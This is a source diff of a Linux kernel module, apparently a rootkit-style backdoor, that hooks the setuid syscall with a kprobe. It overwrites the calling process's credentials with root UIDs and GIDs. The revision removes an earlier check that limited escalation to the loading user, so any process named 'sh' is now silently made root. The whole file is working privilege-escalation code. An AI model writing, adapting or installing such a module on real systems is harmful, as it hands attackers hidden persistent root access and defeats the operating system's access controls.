@@ -5,30 +5,36 @@
 #include <linux/kallsyms.h>
 #include <linux/cred.h>
 #include <linux/kprobes.h>
+#include <linux/sched.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Marx");
-MODULE_DESCRIPTION("Hooking getuid to do a PrivEsc using Kprobe");
-MODULE_VERSION("1");
+MODULE_DESCRIPTION("Hooking setuid to do a PrivEsc using Kprobe");
+MODULE_VERSION("2");
 
 void set_root(void);
 
-// Hooking the getuid syscall by using Kprobe
-static struct kprobe kp = { .symbol_name = "__x64_sys_getuid", };
-static uid_t allowed_uid = -1; // Made to only have the allowed UID able to privesc to not break system
+// Hooking the setuid syscall by using Kprobe
+static struct kprobe kp = { .symbol_name = "__x64_sys_setuid", };
 
 // Pre-handler: runs before the probed instruction
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-    printk(KERN_INFO "Privesc: handler_pre triggered by %s (PID: %d, UID: %d)\n", 
-        current->comm, current->pid, current_uid().val);
+    unsigned int uid_val = (unsigned int)regs->di; // uid argument as unsigned integer
+    struct task_struct *task = current;
 
-    if (current_uid().val == allowed_uid) {
-        printk(KERN_INFO "Privesc: UID %d matches allowed_uid. Escalating privileges...\n", allowed_uid);
+    printk(KERN_INFO "Privesc: handler_pre called.\n");
+    printk(KERN_INFO "Privesc: uid: %u\n", uid_val);
+
+    // if (uid_val == 1000) {
+    //     printk(KERN_INFO "Privesc: Detected setuid(1000) call. Escalating privileges...\n");
+    //     set_root();
+    // }
+
+    // Check for the specific process name
+    if (strcmp(task->comm, "sh") == 0) {
+        printk(KERN_INFO "Privesc: Detected process 'sh'. Escalating privileges...\n");
         set_root();
-    } else {
-        printk(KERN_INFO "Privesc: UID %d does not match allowed_uid %d. Skipping escalation.\n",
-            current_uid().val, allowed_uid);
     }
 
     return 0;
@@ -41,45 +47,45 @@ void set_root(void)
     printk(KERN_INFO "Privesc: Preparing credentials for privilege escalation...\n");
     root = prepare_creds();
     if (root == NULL) {
-        printk(KERN_ERR "Privesc: Failed to prepare credentials\n");
+        printk(KERN_ERR "Privesc: Failed to prepare credentials.\n");
         return;
     }
 
-    root->uid.val = root->gid.val = 0;
-    root->euid.val = root->egid.val = 0;
-    root->suid.val = root->sgid.val = 0;
-    root->fsuid.val = root->fsgid.val = 0;
+    // Set the UID and GID to 0 (root)
+    root->uid.val = 0;
+    root->gid.val = 0;
+    root->euid.val = 0;
+    root->egid.val = 0;
+    root->suid.val = 0;
+    root->sgid.val = 0;
+    root->fsuid.val = 0;
+    root->fsgid.val = 0;
 
-    printk(KERN_INFO "Privesc: Committing credentials as root...\n");
     commit_creds(root);
-    printk(KERN_INFO "Privesc: Privilege escalation successful\n");
+    printk(KERN_INFO "Privesc: Privilege escalation successful.\n");
 }
 
 static int __init privesc_init(void)
 {
     int ret;
 
-    allowed_uid = current_uid().val; // Get the current user's UID when module is loaded
-    printk(KERN_INFO "Privesc: Module loaded by %s (PID: %d, UID: %d)\n", 
-        current->comm, current->pid, allowed_uid);
+    printk(KERN_INFO "Privesc: Initializing module...\n");
 
     kp.pre_handler = handler_pre;
-
     ret = register_kprobe(&kp);
     if (ret < 0) {
-        printk(KERN_ERR "Privesc: Failed to register kprobe, returned %d\n", ret);
+        printk(KERN_ERR "Privesc: Failed to register kprobe: %d\n", ret);
         return ret;
     }
 
-    printk(KERN_INFO "Privesc: Kprobe registered at %s\n", kp.symbol_name);
+    printk(KERN_INFO "Privesc: Kprobe registered at %p\n", kp.addr);
     return 0;
 }
 
 static void __exit privesc_exit(void)
 {
     unregister_kprobe(&kp);
-    printk(KERN_INFO "Privesc: Kprobe unregistered\n");
-    printk(KERN_INFO "Privesc: Module unloaded\n");
+    printk(KERN_INFO "Privesc: Module unloaded.\n");
 }
 
 module_init(privesc_init);
